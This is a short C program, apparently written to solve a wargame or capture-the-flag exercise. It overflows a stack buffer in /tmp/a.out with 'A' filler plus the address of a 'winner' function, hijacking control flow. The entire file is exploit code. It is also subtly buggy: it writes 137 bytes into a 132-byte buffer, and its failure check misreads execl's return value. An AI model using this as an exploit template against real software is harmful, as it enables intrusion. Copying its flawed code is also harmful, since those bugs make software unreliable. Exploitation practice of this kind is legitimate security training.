/*
Just trying...
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define JUNK 0x41

char *convert(char *, unsigned int);

// winner - 0804847e

int main(void)
{
	const char *path = "/tmp/a.out";
	const char *name = "a.out";

	char payload[132];
	char winner[5];

	unsigned int tmp_winner = 0x0804847e;

	convert(winner, tmp_winner);

	snprintf(payload, 137, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%s", winner);

	if(!execl(path, name, payload, 0))
	{
		fprintf(stderr, "[x] Exploit failed. Debug it.\n");
		exit(1);
	}

	return 0;
}

char *convert(char *output, unsigned int address)
{
    snprintf(output, 5, "%c%c%c%c", (char)address&0x000000FF, (char)(address >> 8)&0x000000FF, (char)(address >> 16)&0x000000FF, (char)(address >> 24)&0x000000FF);
    return 0;
}
